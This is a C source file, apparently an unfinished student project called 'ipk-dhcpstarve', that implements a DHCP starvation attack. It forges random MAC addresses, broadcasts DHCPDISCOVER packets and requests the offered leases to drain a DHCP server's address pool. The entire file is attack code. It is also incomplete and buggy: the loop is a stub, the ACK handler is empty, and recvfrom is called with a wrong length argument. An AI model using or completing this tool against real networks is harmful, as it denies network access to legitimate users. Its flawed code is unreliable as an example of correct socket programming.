#include <netinet/in.h>
#include <net/if.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <zconf.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include "starve.h"

#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68

#define MAX_DHCP_CHADDR_LENGTH 16
#define MAX_DHCP_SNAME_LENGTH 64
#define MAX_DHCP_FILE_LENGTH 128
#define MAX_DHCP_OPTIONS_LENGTH 312    //minimum

#define DHCP_BROADCAST_FLAG 0x8000

#define BOOTREQUEST 1
#define BOOTREPLY 2

#define DHCPDISCOVER 1
#define DHCPOFFER 2
#define DHCPREQUEST 3
#define DHCPACK 5

#define ETHERNET_HARDWARE_ADDRESS  1    //htype
#define CHADDR_LEN 6

#define DHCP_OPTION_MESSAGE_TYPE        53

int dhcpoffer_timeout=2;



char *network_interface_name;

int generate_chaddr(uint8_t *chaddr) {
    for (int i = 0; i<CHADDR_LEN; i++) {
        chaddr[i] = (uint8_t) rand();
    }
}

int create_dhcp_socket(void) {
    struct sockaddr_in myname;
    struct ifreq interface;
    int sock;
    int flag = 1;

    /* Set up the address we're going to bind to. */
    bzero(&myname, sizeof(myname));
    myname.sin_family = AF_INET;
    myname.sin_port = htons(DHCP_CLIENT_PORT);
    myname.sin_addr.s_addr = INADDR_ANY;                 /* listen on any address */
    bzero(&myname.sin_zero, sizeof(myname.sin_zero));

    /* create a socket for DHCP communications */
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Error: Could not create socket!\n");
        exit(EXIT_FAILURE);
    }

    /* set the reuse address flag so we don't get errors when restarting */
    flag = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &flag, sizeof(flag)) < 0) {
        printf("Error: Could not set reuse address option on DHCP socket!\n");
        exit(EXIT_FAILURE);
    }

    /* set the broadcast option - we need this to listen to DHCP broadcast messages */
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *) &flag, sizeof flag) < 0) {
        printf("Error: Could not set broadcast option on DHCP socket!\n");
        exit(EXIT_FAILURE);
    }

    //TODO POTREBUJE ROOT!!!!!!!!!
    /* bind socket to interface */
    strncpy(interface.ifr_ifrn.ifrn_name, network_interface_name, IFNAMSIZ);
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *) &interface, sizeof(interface)) < 0) {
        printf("Error: Could not bind socket to interface %s.  Check your privileges...\n", network_interface_name);
        exit(EXIT_FAILURE);
    }

    /* bind the socket */
    if (bind(sock, (struct sockaddr *) &myname, sizeof(myname)) < 0) {
        printf("Error: Could not bind to DHCP socket (port %d)!  Check your privileges...\n", DHCP_CLIENT_PORT);
        exit(EXIT_FAILURE);
    }

    return sock;
}

/* sends a DHCP packet */
int send_dhcp_packet(void *buffer, int buffer_size, int sock, struct sockaddr_in *dest){
    ssize_t result=sendto(sock,(char *)buffer,buffer_size,0,(struct sockaddr *)dest,sizeof(*dest));

    if(result<0)
        return -1;

    return 1;
}

/* sends a DHCPDISCOVER broadcast message in an attempt to find DHCP servers */
int send_DHCP_discover(int sock, uint8_t *chaddr, uint32_t xid) {
    dhcp_packet discover_packet;
    struct sockaddr_in sockaddr_broadcast;

    /* clear the packet */
    bzero(&discover_packet, sizeof(discover_packet));

    discover_packet.op = BOOTREQUEST;
    discover_packet.htype=ETHERNET_HARDWARE_ADDRESS;
    discover_packet.hlen=CHADDR_LEN;
    discover_packet.hops = 0;
    discover_packet.xid = xid;
    discover_packet.flags = htons(DHCP_BROADCAST_FLAG);     //BROADCAST FLAG
    discover_packet.secs = 0;
    /*
     * ciaddr = 0
     * yiaddr = 0
     * siaddr = 0
     * giaddr = 0
     */
    memcpy(discover_packet.chaddr, chaddr, CHADDR_LEN); //chaddr

    /* magic cookie */
    discover_packet.options[0] = '\x63';
    discover_packet.options[1] = '\x82';
    discover_packet.options[2] = '\x53';
    discover_packet.options[3] = '\x63';

    /* DHCP message type is embedded in options field */
    discover_packet.options[4] = DHCP_OPTION_MESSAGE_TYPE;  /* DHCP message type option identifier */
    discover_packet.options[5] = 1;                         /* DHCP message option length in bytes */
    discover_packet.options[6] = DHCPDISCOVER;

    /* send the DHCPDISCOVER packet to broadcast address */
    sockaddr_broadcast.sin_family = AF_INET;
    sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
    sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
    bzero(&sockaddr_broadcast.sin_zero, sizeof(sockaddr_broadcast.sin_zero));

    /* send the DHCPDISCOVER packet out */
    sendto(sock,&discover_packet, sizeof(discover_packet), 0, &sockaddr_broadcast, sizeof(sockaddr_broadcast));
    return 1;
}

int recv_DHCP_offer(int sock, int expect_xid, struct in_addr *offered_ip) {
    bool correct = false;
    dhcp_packet offer;
    struct sockaddr_in source_address;
    ssize_t recv_res;

    while (!correct) {
        recv_res = recvfrom(sock, &offer, sizeof(offer), 0, &source_address, sizeof(source_address));
        if (recv_res < 0) {
            printf("Error: Recieve failed");
            exit(EXIT_FAILURE);
        }

        if ((offer.xid == expect_xid) && (1)) { //TODO and chaddr
            correct = true;
        }   // else wait for new offer
    }

    *offered_ip = offer.yiaddr;

    return 1;

}

void print_help() {
    printf("./ipk-dhcpstarve -i interface\n");
}

int parse_args(int argc, char **argv) {
    int c;
    while ((c = getopt (argc, argv, "i:")) != -1)
        switch (c)
        {
            case 'i':
                network_interface_name = optarg;
                break;
            default:
                print_help();
                exit(0);
        }
}

int send_DHCP_request(int sock, uint32_t xid, uint8_t *chaddr) {
    dhcp_packet request_packet;
    struct sockaddr_in sockaddr_broadcast;

    /* clear the packet */
    bzero(&request_packet, sizeof(request_packet));

    request_packet.op = BOOTREQUEST;
    request_packet.htype=ETHERNET_HARDWARE_ADDRESS;
    request_packet.hlen=CHADDR_LEN;
    request_packet.hops = 0;

    request_packet.xid = xid;   //xid is random

    request_packet.secs = 0;   //TODO sekundy od zaciatku
    request_packet.flags = htons(DHCP_BROADCAST_FLAG);     //BROADCAST FLAG
    /*
     * ciaddr = 0
     * yiaddr = 0
     * siaddr = 0
     * giaddr = 0
     */
    memcpy(request_packet.chaddr, chaddr, CHADDR_LEN);      //chaddr

    /* magic cookie */
    request_packet.options[0] = '\x63';
    request_packet.options[1] = '\x82';
    request_packet.options[2] = '\x53';
    request_packet.options[3] = '\x63';

    /* DHCP discover */
    request_packet.options[4] = DHCP_OPTION_MESSAGE_TYPE;  /* DHCP message type option identifier */
    request_packet.options[5] = 1;                         /* DHCP message option length in bytes */
    request_packet.options[6] = DHCPREQUEST;

    /* send the DHCPDISCOVER packet to broadcast address */
    sockaddr_broadcast.sin_family = AF_INET;
    sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
    sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
    bzero(&sockaddr_broadcast.sin_zero, sizeof(sockaddr_broadcast.sin_zero));

    /* send the DHCPDISCOVER packet out */
    sendto(sock,&request_packet, sizeof(request_packet), 0, &sockaddr_broadcast, sizeof(sockaddr_broadcast));
    return 1;

    //TODO neni tam zakodovana ip
}

int recv_DHCP_ack() {

}

int main(int argc, char **argv) {
    uint8_t chaddr[CHADDR_LEN] = {0};   /* MAC address */
    uint32_t xid;
    struct in_addr offered_IP;

    parse_args(argc, argv);

    int dhcp_socket = create_dhcp_socket();

    printf("socket spraveny\n");
    srand(time(NULL));

    if (1) {    //todo while
        generate_chaddr(chaddr);
        xid = htonl(random());

        send_DHCP_discover(dhcp_socket, chaddr, xid);
        recv_DHCP_offer(dhcp_socket, xid, &offered_IP);
        send_DHCP_request(dhcp_socket, xid, chaddr);
//        recv_DHCP_ack();
    }

    close(dhcp_socket);

}
